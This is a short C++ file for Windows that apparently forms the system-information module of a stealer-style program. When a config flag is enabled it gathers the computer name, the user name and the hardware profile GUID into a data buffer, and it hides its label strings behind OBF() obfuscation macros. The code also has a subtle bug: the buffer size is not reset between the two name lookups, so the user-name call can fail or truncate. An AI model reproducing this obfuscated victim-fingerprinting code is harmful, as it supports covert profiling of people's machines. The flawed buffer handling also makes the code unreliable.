#include <string>
#include <windows.h>

#include "config.h"

#include "system.h"

System::System() noexcept
{
	if (!config::system)
		return;

	this->GetSystemInfo();
}

void System::GetSystemInfo() noexcept
{
	char buffer[256];
	DWORD size = sizeof(buffer);
	HW_PROFILE_INFOA hwProfile = { 0 };


	if (GetComputerNameA(buffer, &size))
		this->data.append(OBF("SYSTEM NAME: ") + std::string(buffer) + OBF_ENDL);

	if(GetUserNameA(buffer, &size))
		this->data.append(OBF("USER: ") + std::string(buffer) + OBF_ENDL);

	if(GetCurrentHwProfileA(&hwProfile))
		this->data.append(OBF("HARDWARE PROFILE GUID: ") + std::string(hwProfile.szHwProfileGuid) + OBF_ENDL);
}